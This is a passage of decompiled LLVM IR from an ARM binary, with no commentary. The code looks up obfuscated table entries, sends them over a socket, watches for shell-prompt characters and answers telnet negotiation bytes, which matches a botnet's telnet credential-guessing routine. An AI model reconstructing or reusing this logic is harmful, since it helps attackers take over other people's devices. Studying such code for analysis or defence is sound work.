  %v1_10a6c696 = add i32 %v0_10a6c695, -1
  store i32 %v1_10a6c696, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10a74

bb1947:                                           ; preds = %dec_label_pc_10a60
  %v3_10a68 = icmp ugt i8 %v3_10a60, 57
  store i1 %v3_10a68, i1* %cpsr_c.global-to-local, align 1
  %v8_10a68 = icmp eq i8 %v3_10a60, 58
  store i1 %v8_10a68, i1* %cpsr_z.global-to-local, align 1
  %v1_10a6c = add i32 %v0_10a6c695, -1
  store i32 %v1_10a6c, i32* %r3.global-to-local, align 4
  br i1 %v8_10a68, label %dec_label_pc_10a74, label %dec_label_pc_10a40

dec_label_pc_10a74:                               ; preds = %bb1947, %dec_label_pc_10a50, %dec_label_pc_10a48, %dec_label_pc_10a40, %dec_label_pc_10a2c, %dec_label_pc_10a08, %.thread694, %dec_label_pc_10a24, %dec_label_pc_10a1c, %bb1946
  %v0_10a78 = phi i32 [ %v1_109fc, %dec_label_pc_10a2c ], [ %v1_109fc, %dec_label_pc_10a08 ], [ %v1_10a58, %.thread694 ], [ %v1_109fc, %dec_label_pc_10a24 ], [ %v1_109fc, %dec_label_pc_10a1c ], [ %v1_109fc, %bb1946 ], [ %v1_10a58, %dec_label_pc_10a40 ], [ %v1_10a58, %dec_label_pc_10a48 ], [ %v1_10a58, %dec_label_pc_10a50 ], [ %v1_10a58, %bb1947 ]
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10a78 = add i32 %v0_10a78, 1
  store i32 %v1_10a78, i32* @r7, align 4
  %v1_10a7c = call i32 @table_unlock_val(i32 4)
  store i32 %v2_10df4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_10a8c = call i32 @table_retrieve_val(i32 4, i32* nonnull %stack_var_-60)
  store i32 %v3_10a8c, i32* %r0.global-to-local, align 4
  %v3_10a90 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10a90, i32* %r2.global-to-local, align 4
  store i32 %v3_10a8c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10a9c = load i32, i32* @r6, align 4
  %v1_10a9c = add i32 %v0_10a9c, 4
  %v2_10a9c = inttoptr i32 %v1_10a9c to i32*
  %v3_10a9c = load i32, i32* %v2_10a9c, align 4
  store i32 %v3_10a9c, i32* %r0.global-to-local, align 4
  %v4_10aa0 = call i32 @__libc_send(i32 %v3_10a9c, i32 %v3_10a8c, i32 %v3_10a90, i32 16384)
  store i32 %v4_10aa0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10ab0 = load i32, i32* @r6, align 4
  %v1_10ab0 = add i32 %v0_10ab0, 4
  %v2_10ab0 = inttoptr i32 %v1_10ab0 to i32*
  %v3_10ab0 = load i32, i32* %v2_10ab0, align 4
  store i32 %v3_10ab0, i32* %r0.global-to-local, align 4
  %v4_10ab4 = call i32 @__libc_send(i32 %v3_10ab0, i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10abc = call i32 @table_lock_val(i32 4)
  store i32 %v1_10abc, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_10ac4 = load i32, i32* @r6, align 4
  %v2_10ac4 = add i32 %v1_10ac4, 12
  %v3_10ac4 = inttoptr i32 %v2_10ac4 to i32*
  store i32 8, i32* %v3_10ac4, align 4
  br label %dec_label_pc_10828

dec_label_pc_10acc:                               ; preds = %dec_label_pc_10710
  %v1_10acc = add i32 %v0_10710, 24
  %v2_10acc = inttoptr i32 %v1_10acc to i32*
  %v3_10acc = load i32, i32* %v2_10acc, align 4
  store i32 %v3_10acc, i32* %r2.global-to-local, align 4
  %v1_10ad0 = add i32 %v3_10acc, -1
  store i32 %v1_10ad0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10ad4 = icmp eq i32 %v1_10ad0, 0
  store i1 %v2_10ad4, i1* %cpsr_z.global-to-local, align 1
  %tmp1948 = icmp slt i32 %v1_10ad0, 1
  br i1 %tmp1948, label %dec_label_pc_10694.backedge.thread, label %dec_label_pc_10adc

dec_label_pc_10adc:                               ; preds = %dec_label_pc_10acc
  %v2_10adc = add i32 %v1_10ad0, %v0_10710
  store i32 %v2_10adc, i32* %r3.global-to-local, align 4
  %v1_10ae0 = add i32 %v2_10adc, 28
  %v2_10ae0 = inttoptr i32 %v1_10ae0 to i8*
  %v3_10ae0 = load i8, i8* %v2_10ae0, align 1
  %v4_10ae0 = zext i8 %v3_10ae0 to i32
  store i32 %v4_10ae0, i32* %r3.global-to-local, align 4
  %v2_10ae4 = icmp ugt i8 %v3_10ae0, 61
  store i1 %v2_10ae4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ae4 = icmp eq i8 %v3_10ae0, 62
  store i1 %v7_10ae4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ae4, label %dec_label_pc_10b48, label %bb1949

bb1949:                                           ; preds = %dec_label_pc_10adc
  %v3_10ae8 = icmp ugt i8 %v3_10ae0, 57
  store i1 %v3_10ae8, i1* %cpsr_c.global-to-local, align 1
  %v8_10ae8 = icmp eq i8 %v3_10ae0, 58
  store i1 %v8_10ae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10ae8, label %dec_label_pc_10b48, label %dec_label_pc_10af0

dec_label_pc_10af0:                               ; preds = %bb1949
  %v2_10af0 = icmp ugt i8 %v3_10ae0, 35
  store i1 %v2_10af0, i1* %cpsr_c.global-to-local, align 1
  %v7_10af0 = icmp eq i8 %v3_10ae0, 36
  store i1 %v7_10af0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10af0, label %dec_label_pc_10b48, label %dec_label_pc_10af8

dec_label_pc_10af8:                               ; preds = %dec_label_pc_10af0
  %v2_10af8 = icmp ugt i8 %v3_10ae0, 34
  store i1 %v2_10af8, i1* %cpsr_c.global-to-local, align 1
  %v7_10af8 = icmp eq i8 %v3_10ae0, 35
  store i1 %v7_10af8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10af8, label %dec_label_pc_10b48, label %dec_label_pc_10b00

dec_label_pc_10b00:                               ; preds = %dec_label_pc_10af8
  %v2_10b00 = icmp ugt i8 %v3_10ae0, 36
  store i1 %v2_10b00, i1* %cpsr_c.global-to-local, align 1
  %v7_10b00 = icmp eq i8 %v3_10ae0, 37
  store i1 %v7_10b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b00, label %dec_label_pc_10b48, label %dec_label_pc_10b2c.preheader

dec_label_pc_10b2c.preheader:                     ; preds = %dec_label_pc_10b00
  %v3_10b04 = add i32 %v0_10710, 28
  %v2_10b08 = add i32 %v3_10b04, %v3_10acc
  store i32 %v2_10b08, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10b2c

dec_label_pc_10b14:                               ; preds = %bb1950
  %v2_10b14 = icmp ugt i8 %v3_10b34, 35
  store i1 %v2_10b14, i1* %cpsr_c.global-to-local, align 1
  %v7_10b14 = icmp eq i8 %v3_10b34, 36
  store i1 %v7_10b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b14, label %dec_label_pc_10b48, label %dec_label_pc_10b1c

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10b14
  %v2_10b1c = icmp ugt i8 %v3_10b34, 34
  store i1 %v2_10b1c, i1* %cpsr_c.global-to-local, align 1
  %v7_10b1c = icmp eq i8 %v3_10b34, 35
  store i1 %v7_10b1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b1c, label %dec_label_pc_10b48, label %dec_label_pc_10b24

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b1c
  %v2_10b24 = icmp ugt i8 %v3_10b34, 36
  store i1 %v2_10b24, i1* %cpsr_c.global-to-local, align 1
  %v7_10b24 = icmp eq i8 %v3_10b34, 37
  store i1 %v7_10b24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b24, label %dec_label_pc_10b48, label %dec_label_pc_10b2c

dec_label_pc_10b2c:                               ; preds = %dec_label_pc_10b2c.preheader, %dec_label_pc_10b24
  %v0_10b40702 = phi i32 [ %v2_10b08, %dec_label_pc_10b2c.preheader ], [ %v1_10b40, %dec_label_pc_10b24 ]
  %v0_10b2c = phi i32 [ %v1_10ad0, %dec_label_pc_10b2c.preheader ], [ %v1_10b2c, %dec_label_pc_10b24 ]
  %v1_10b2c = add i32 %v0_10b2c, -1
  store i32 %v1_10b2c, i32* %r1.global-to-local, align 4
  %v2_10b2c = icmp ne i32 %v0_10b2c, 0
  store i1 %v2_10b2c, i1* %cpsr_c.global-to-local, align 1
  %v7_10b2c = icmp eq i32 %v0_10b2c, 1
  store i1 %v7_10b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b2c, label %dec_label_pc_10694.backedge.thread2185, label %dec_label_pc_10b34

dec_label_pc_10b34:                               ; preds = %dec_label_pc_10b2c
  %v1_10b34 = add i32 %v0_10b40702, -2
  %v2_10b34 = inttoptr i32 %v1_10b34 to i8*
  %v3_10b34 = load i8, i8* %v2_10b34, align 1
  %v4_10b34 = zext i8 %v3_10b34 to i32
  store i32 %v4_10b34, i32* %r2.global-to-local, align 4
  %v2_10b38 = icmp ugt i8 %v3_10b34, 61
  store i1 %v2_10b38, i1* %cpsr_c.global-to-local, align 1
  %v7_10b38 = icmp eq i8 %v3_10b34, 62
  store i1 %v7_10b38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b38, label %.thread701, label %bb1950

.thread701:                                       ; preds = %dec_label_pc_10b34
  %v1_10b40703 = add i32 %v0_10b40702, -1
  store i32 %v1_10b40703, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10b48

bb1950:                                           ; preds = %dec_label_pc_10b34
  %v3_10b3c = icmp ugt i8 %v3_10b34, 57
  store i1 %v3_10b3c, i1* %cpsr_c.global-to-local, align 1
  %v8_10b3c = icmp eq i8 %v3_10b34, 58
  store i1 %v8_10b3c, i1* %cpsr_z.global-to-local, align 1
  %v1_10b40 = add i32 %v0_10b40702, -1
  store i32 %v1_10b40, i32* %r3.global-to-local, align 4
  br i1 %v8_10b3c, label %dec_label_pc_10b48, label %dec_label_pc_10b14

dec_label_pc_10b48:                               ; preds = %bb1950, %dec_label_pc_10b24, %dec_label_pc_10b1c, %dec_label_pc_10b14, %dec_label_pc_10b00, %dec_label_pc_10adc, %.thread701, %dec_label_pc_10af8, %dec_label_pc_10af0, %bb1949
  %v0_10b4c = phi i32 [ %v1_10ad0, %dec_label_pc_10b00 ], [ %v1_10ad0, %dec_label_pc_10adc ], [ %v1_10b2c, %.thread701 ], [ %v1_10ad0, %dec_label_pc_10af8 ], [ %v1_10ad0, %dec_label_pc_10af0 ], [ %v1_10ad0, %bb1949 ], [ %v1_10b2c, %dec_label_pc_10b14 ], [ %v1_10b2c, %dec_label_pc_10b1c ], [ %v1_10b2c, %dec_label_pc_10b24 ], [ %v1_10b2c, %bb1950 ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_10b4c = add i32 %v0_10b4c, 1
  store i32 %v1_10b4c, i32* @r7, align 4
  %v1_10b50 = call i32 @table_unlock_val(i32 6)
  store i32 %v2_10df4, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_10b60 = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_10b60, i32* %r0.global-to-local, align 4
  %v3_10b64 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10b64, i32* %r2.global-to-local, align 4
  store i32 %v3_10b60, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10b70 = load i32, i32* @r6, align 4
  %v1_10b70 = add i32 %v0_10b70, 4
  %v2_10b70 = inttoptr i32 %v1_10b70 to i32*
  %v3_10b70 = load i32, i32* %v2_10b70, align 4
  store i32 %v3_10b70, i32* %r0.global-to-local, align 4
  %v4_10b74 = call i32 @__libc_send(i32 %v3_10b70, i32 %v3_10b60, i32 %v3_10b64, i32 16384)
  store i32 %v4_10b74, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10b84 = load i32, i32* @r6, align 4
  %v1_10b84 = add i32 %v0_10b84, 4
  %v2_10b84 = inttoptr i32 %v1_10b84 to i32*
  %v3_10b84 = load i32, i32* %v2_10b84, align 4
  store i32 %v3_10b84, i32* %r0.global-to-local, align 4
  %v4_10b88 = call i32 @__libc_send(i32 %v3_10b84, i32 ptrtoint ([3 x i8]* @global_var_1a8d4.225 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_10b90 = call i32 @table_lock_val(i32 6)
  store i32 %v1_10b90, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_10b98 = load i32, i32* @r6, align 4
  %v2_10b98 = add i32 %v1_10b98, 12
  %v3_10b98 = inttoptr i32 %v2_10b98 to i32*
  store i32 7, i32* %v3_10b98, align 4
  br label %dec_label_pc_10828

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10710
  %v1_10ba0 = add i32 %v0_10710, 24
  %v2_10ba0 = inttoptr i32 %v1_10ba0 to i32*
  %v3_10ba0 = load i32, i32* %v2_10ba0, align 4
  store i32 %v3_10ba0, i32* %r2.global-to-local, align 4
  %v0_10ba4 = load i32, i32* @sl, align 4
  store i32 %v0_10ba4, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_10bac766 = icmp eq i32 %v3_10ba0, 0
  store i1 %v3_10bac766, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_10bac766, i1* %cpsr_z.global-to-local, align 1
  %v6_10bb0773 = icmp sgt i32 %v3_10ba0, 0
  br i1 %v6_10bb0773, label %dec_label_pc_10bb4.preheader, label %dec_label_pc_10c60

dec_label_pc_10bac.loopexit:                      ; preds = %dec_label_pc_10bd0
  %v2_10bd8 = add i32 %v1_10bd8, 2
  store i32 %v2_10bd8, i32* @r4, align 4
  %v2_10bdc = add i32 %v1_10bdc, 2
  store i32 %v2_10bdc, i32* @r7, align 4
  %v3_10bac = icmp uge i32 %v2_10bdc, %v1_10bac
  store i1 %v3_10bac, i1* %cpsr_c.global-to-local, align 1
  %v9_10bac = icmp eq i32 %v2_10bdc, %v1_10bac
  store i1 %v9_10bac, i1* %cpsr_z.global-to-local, align 1
  %v6_10bb0 = icmp slt i32 %v2_10bdc, %v1_10bac
  br i1 %v6_10bb0, label %dec_label_pc_10bb4.preheader, label %dec_label_pc_10c60

dec_label_pc_10bb4.preheader:                     ; preds = %dec_label_pc_10ba0, %dec_label_pc_10bac.loopexit
  %v6_10c681138 = phi i32 [ %v6_10c681139, %dec_label_pc_10bac.loopexit ], [ %v0_10710, %dec_label_pc_10ba0 ]
  %v1_10bdc1127 = phi i32 [ %v2_10bdc, %dec_label_pc_10bac.loopexit ], [ 0, %dec_label_pc_10ba0 ]
  %v1_10bc01125 = phi i32 [ %v1_10bac, %dec_label_pc_10bac.loopexit ], [ %v3_10ba0, %dec_label_pc_10ba0 ]
  %v0_10bb41123 = phi i32 [ %v2_10bd8, %dec_label_pc_10bac.loopexit ], [ %v0_10ba4, %dec_label_pc_10ba0 ]
  br label %dec_label_pc_10bb4

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10bb4.preheader, %dec_label_pc_10c44
  %v6_10c681139 = phi i32 [ %v6_10c681138, %dec_label_pc_10bb4.preheader ], [ %v0_10c4c, %dec_label_pc_10c44 ]
  %v1_10bdc = phi i32 [ %v1_10bdc1127, %dec_label_pc_10bb4.preheader ], [ %v1_10c50, %dec_label_pc_10c44 ]
  %v1_10bac = phi i32 [ %v1_10bc01125, %dec_label_pc_10bb4.preheader ], [ %v3_10c4c, %dec_label_pc_10c44 ]
  %v1_10bd8 = phi i32 [ %v0_10bb41123, %dec_label_pc_10bb4.preheader ], [ %v1_10c58, %dec_label_pc_10c44 ]
  %v1_10bb4 = inttoptr i32 %v1_10bd8 to i8*
  %v2_10bb4 = load i8, i8* %v1_10bb4, align 1
  %v3_10bb4 = zext i8 %v2_10bb4 to i32
  store i32 %v3_10bb4, i32* @r3, align 4
  %v2_10bb8 = icmp eq i8 %v2_10bb4, -1
  store i1 %v2_10bb8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_10bb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10bb8, label %dec_label_pc_10bc0, label %dec_label_pc_10c60

dec_label_pc_10bc0:                               ; preds = %dec_label_pc_10bb4
  %v0_10bc0 = load i32, i32* @sl, align 4
  %v2_10bc0 = add i32 %v0_10bc0, %v1_10bac
  store i32 %v2_10bc0, i32* %r1.global-to-local, align 4
  %v1_10bc4 = add i32 %v1_10bd8, 1
  store i32 %v1_10bc4, i32* @r5, align 4
  %v3_10bc8 = icmp uge i32 %v2_10bc0, %v1_10bc4
  store i1 %v3_10bc8, i1* %cpsr_c.global-to-local, align 1
  %v9_10bc8 = icmp eq i32 %v2_10bc0, %v1_10bc4
  store i1 %v9_10bc8, i1* %cpsr_z.global-to-local, align 1
  %v2_10bcc = xor i1 %v3_10bc8, true
  %v3_10bcc = or i1 %v9_10bc8, %v2_10bcc
  br i1 %v3_10bcc, label %dec_label_pc_10c60, label %dec_label_pc_10bd0

dec_label_pc_10bd0:                               ; preds = %dec_label_pc_10bc0
  %v2_10bd0 = inttoptr i32 %v1_10bc4 to i8*
  %v3_10bd0 = load i8, i8* %v2_10bd0, align 1
  %v4_10bd0 = zext i8 %v3_10bd0 to i32
  store i32 %v4_10bd0, i32* @r3, align 4
  %v2_10bd4 = icmp eq i8 %v3_10bd0, -1
  store i1 %v2_10bd4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_10bd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10bd4, label %dec_label_pc_10bac.loopexit, label %dec_label_pc_10be4

dec_label_pc_10be4:                               ; preds = %dec_label_pc_10bd0
  %v2_10be4 = icmp ugt i8 %v3_10bd0, -4
  store i1 %v2_10be4, i1* %cpsr_c.global-to-local, align 1
  %v7_10be4 = icmp eq i8 %v3_10bd0, -3
  store i1 %v7_10be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10be4, label %dec_label_pc_10f58, label %dec_label_pc_10bec

dec_label_pc_10bec:                               ; preds = %dec_label_pc_10be4
  %v1_10bec = add i32 %v1_10bd8, 2
  store i32 %v1_10bec, i32* @r3, align 4
  %v3_10bf0 = icmp uge i32 %v2_10bc0, %v1_10bec
  store i1 %v3_10bf0, i1* %cpsr_c.global-to-local, align 1
  %v9_10bf0 = icmp eq i32 %v2_10bc0, %v1_10bec
  store i1 %v9_10bf0, i1* %cpsr_z.global-to-local, align 1
  %v2_10bf4 = xor i1 %v3_10bf0, true
  %v3_10bf4 = or i1 %v9_10bf0, %v2_10bf4
  br i1 %v3_10bf4, label %dec_label_pc_10c60, label %dec_label_pc_10bf8

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10fb4, %bb1966, %.thread745, %dec_label_pc_10bec
  %v0_10bf8 = load i32, i32* @r5, align 4
  %v1_10bf8 = inttoptr i32 %v0_10bf8 to i8*
  %v2_10bf8 = load i8, i8* %v1_10bf8, align 1
  %v3_10bf8 = zext i8 %v2_10bf8 to i32
  store i32 %v3_10bf8, i32* %r3.global-to-local, align 4
  %v2_10bfc = icmp ugt i8 %v2_10bf8, -4
  store i1 %v2_10bfc, i1* %cpsr_c.global-to-local, align 1
  %v7_10bfc = icmp eq i8 %v2_10bf8, -3
  store i1 %v7_10bfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10bfc, label %.thread707, label %dec_label_pc_10c0c

.thread707:                                       ; preds = %dec_label_pc_10bf8
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_10bf8, align 1
  %v0_10c08.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10c08.pr.pr, label %.thread710, label %.thread707.dec_label_pc_10c0cthread-pre-split_crit_edge

.thread707.dec_label_pc_10c0cthread-pre-split_crit_edge: ; preds = %.thread707
  %v0_10c0c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10c0c

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10bf8, %.thread707.dec_label_pc_10c0cthread-pre-split_crit_edge
  %v0_10c0c.pr = phi i32 [ %v0_10c0c.pr.pre, %.thread707.dec_label_pc_10c0cthread-pre-split_crit_edge ], [ %v3_10bf8, %dec_label_pc_10bf8 ]
  %v2_10c0c = icmp ugt i32 %v0_10c0c.pr, 250
  store i1 %v2_10c0c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c0c = icmp eq i32 %v0_10c0c.pr, 251
  store i1 %v7_10c0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c0c, label %bb1951, label %.thread710

bb1951:                                           ; preds = %dec_label_pc_10c0c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_10c14 = load i32, i32* @r5, align 4
  %v4_10c14 = inttoptr i32 %v3_10c14 to i8*
  store i8 -3, i8* %v4_10c14, align 1
  br label %.thread710

.thread710:                                       ; preds = %dec_label_pc_10c0c, %.thread707, %bb1951
  %v0_10c18 = load i32, i32* @r4, align 4
  %v1_10c18 = add i32 %v0_10c18, 2
  %v2_10c18 = inttoptr i32 %v1_10c18 to i8*
  %v3_10c18 = load i8, i8* %v2_10c18, align 1
  %v4_10c18 = zext i8 %v3_10c18 to i32
  store i32 %v4_10c18, i32* %r3.global-to-local, align 4
  %v2_10c1c = icmp ugt i8 %v3_10c18, -4
  store i1 %v2_10c1c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c1c = icmp eq i8 %v3_10c18, -3
  store i1 %v7_10c1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c1c, label %.thread711, label %dec_label_pc_10c2c

.thread711:                                       ; preds = %.thread710
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_10c18, align 1
  %v0_10c28.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10c28.pr.pr, label %.thread714, label %.thread711.dec_label_pc_10c2cthread-pre-split_crit_edge

.thread711.dec_label_pc_10c2cthread-pre-split_crit_edge: ; preds = %.thread711
  %v0_10c2c.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10c2c

dec_label_pc_10c2c:                               ; preds = %.thread710, %.thread711.dec_label_pc_10c2cthread-pre-split_crit_edge
  %v0_10c2c.pr = phi i32 [ %v0_10c2c.pr.pre, %.thread711.dec_label_pc_10c2cthread-pre-split_crit_edge ], [ %v4_10c18, %.thread710 ]
  %v2_10c2c = icmp ugt i32 %v0_10c2c.pr, 250
  store i1 %v2_10c2c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c2c = icmp eq i32 %v0_10c2c.pr, 251
  store i1 %v7_10c2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c2c, label %bb1952, label %.thread714

bb1952:                                           ; preds = %dec_label_pc_10c2c
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_10c34 = load i32, i32* @r4, align 4
  %v4_10c34 = add i32 %v3_10c34, 2
  %v5_10c34 = inttoptr i32 %v4_10c34 to i8*
  store i8 -3, i8* %v5_10c34, align 1
  br label %.thread714

.thread714:                                       ; preds = %dec_label_pc_10c2c, %.thread711, %bb1952
  %v0_10c38 = load i32, i32* @r6, align 4
  %v1_10c38 = add i32 %v0_10c38, 4
  %v2_10c38 = inttoptr i32 %v1_10c38 to i32*
  %v3_10c38 = load i32, i32* %v2_10c38, align 4
  store i32 %v3_10c38, i32* %r0.global-to-local, align 4
  %v0_10c3c = load i32, i32* @r4, align 4
  br label %dec_label_pc_10c44

dec_label_pc_10c44:                               ; preds = %dec_label_pc_1102c, %.thread714
  %v0_10c48 = phi i32 [ %v3_11048, %dec_label_pc_1102c ], [ %v3_10c38, %.thread714 ]
  %storemerge5 = phi i32 [ %v2_10f74, %dec_label_pc_1102c ], [ %v0_10c3c, %.thread714 ]
  %storemerge4 = phi i32 [ 9, %dec_label_pc_1102c ], [ 3, %.thread714 ]
  store i32 %storemerge5, i32* %r1.global-to-local, align 4
  store i32 %storemerge4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10c48 = call i32 @__libc_send(i32 %v0_10c48, i32 %storemerge5, i32 %storemerge4, i32 16384)
  store i32 %v4_10c48, i32* %r0.global-to-local, align 4
  %v0_10c4c = load i32, i32* @r6, align 4
  %v1_10c4c = add i32 %v0_10c4c, 24
  %v2_10c4c = inttoptr i32 %v1_10c4c to i32*
  %v3_10c4c = load i32, i32* %v2_10c4c, align 4
  store i32 %v3_10c4c, i32* %r2.global-to-local, align 4
  %v0_10c50 = load i32, i32* @r7, align 4
  %v1_10c50 = add i32 %v0_10c50, 3
  store i32 %v1_10c50, i32* @r7, align 4
  %v3_10c54 = icmp uge i32 %v1_10c50, %v3_10c4c
  store i1 %v3_10c54, i1* %cpsr_c.global-to-local, align 1
  %v9_10c54 = icmp eq i32 %v1_10c50, %v3_10c4c
  store i1 %v9_10c54, i1* %cpsr_z.global-to-local, align 1
  %v0_10c58 = load i32, i32* @r4, align 4
  %v1_10c58 = add i32 %v0_10c58, 3
  store i32 %v1_10c58, i32* @r4, align 4
  %v5_10c5c = icmp slt i32 %v1_10c50, %v3_10c4c
  br i1 %v5_10c5c, label %dec_label_pc_10bb4, label %dec_label_pc_10c60

dec_label_pc_10c60:                               ; preds = %dec_label_pc_10bac.loopexit, %dec_label_pc_10bb4, %dec_label_pc_10c44, %dec_label_pc_10bec, %dec_label_pc_10bc0, %dec_label_pc_10ba0, %dec_label_pc_10f58.dec_label_pc_10c60.loopexit_crit_edge
  %v6_10c68 = phi i32 [ %v0_10f80, %dec_label_pc_10f58.dec_label_pc_10c60.loopexit_crit_edge ], [ %v0_10710, %dec_label_pc_10ba0 ], [ %v6_10c681139, %dec_label_pc_10bb4 ], [ %v0_10c4c, %dec_label_pc_10c44 ], [ %v6_10c681139, %dec_label_pc_10bec ], [ %v6_10c681139, %dec_label_pc_10bc0 ], [ %v6_10c681139, %dec_label_pc_10bac.loopexit ]
  %v0_10c60 = phi i32 [ %v0_10c60.pre.pre, %dec_label_pc_10f58.dec_label_pc_10c60.loopexit_crit_edge ], [ 0, %dec_label_pc_10ba0 ], [ %v1_10bdc, %dec_label_pc_10bb4 ], [ %v1_10c50, %dec_label_pc_10c44 ], [ %v1_10bdc, %dec_label_pc_10bec ], [ %v1_10bdc, %dec_label_pc_10bc0 ], [ %v2_10bdc, %dec_label_pc_10bac.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c60 = icmp eq i32 %v0_10c60, 0
  store i1 %v2_10c60, i1* %cpsr_z.global-to-local, align 1
  %tmp1953 = icmp slt i32 %v0_10c60, 1
  br i1 %tmp1953, label %.thread1199, label %bb1954

bb1954:                                           ; preds = %dec_label_pc_10c60
  store i32 3, i32* @r3, align 4
  %v7_10c68 = add i32 %v6_10c68, 12
  %v8_10c68 = inttoptr i32 %v7_10c68 to i32*
  store i32 3, i32* %v8_10c68, align 4
  br label %.thread1199

.thread1199:                                      ; preds = %dec_label_pc_10c60, %dec_label_pc_10e68, %dec_label_pc_111c0, %dec_label_pc_10fd8, %dec_label_pc_10d2c, %dec_label_pc_11204, %bb1954
  %v0_10c6c = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c6c = icmp eq i32 %v0_10c6c, 0
  store i1 %v2_10c6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10c6c, label %dec_label_pc_10690.loopexit, label %dec_label_pc_10828

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10710
  %v1_10c78 = add i32 %v0_10710, 24
  %v2_10c78 = inttoptr i32 %v1_10c78 to i32*
  %v3_10c78 = load i32, i32* %v2_10c78, align 4
  store i32 %v3_10c78, i32* %r2.global-to-local, align 4
  %v1_10c7c = add i32 %v3_10c78, -1
  store i32 %v1_10c7c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c80 = icmp eq i32 %v1_10c7c, 0
  store i1 %v2_10c80, i1* %cpsr_z.global-to-local, align 1
  %tmp1955 = icmp slt i32 %v1_10c7c, 1
  br i1 %tmp1955, label %dec_label_pc_10ce4, label %dec_label_pc_10c88

dec_label_pc_10c88:                               ; preds = %dec_label_pc_10c78
  %v2_10c88 = add i32 %v1_10c7c, %v0_10710
  store i32 %v2_10c88, i32* %r3.global-to-local, align 4
  %v1_10c8c = add i32 %v2_10c88, 28
  %v2_10c8c = inttoptr i32 %v1_10c8c to i8*
  %v3_10c8c = load i8, i8* %v2_10c8c, align 1
  %v4_10c8c = zext i8 %v3_10c8c to i32
  store i32 %v4_10c8c, i32* %r3.global-to-local, align 4
  %v2_10c90 = icmp ugt i8 %v3_10c8c, 61
  store i1 %v2_10c90, i1* %cpsr_c.global-to-local, align 1
  %v7_10c90 = icmp eq i8 %v3_10c8c, 62
  store i1 %v7_10c90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c90, label %dec_label_pc_11010, label %bb1956

bb1956:                                           ; preds = %dec_label_pc_10c88
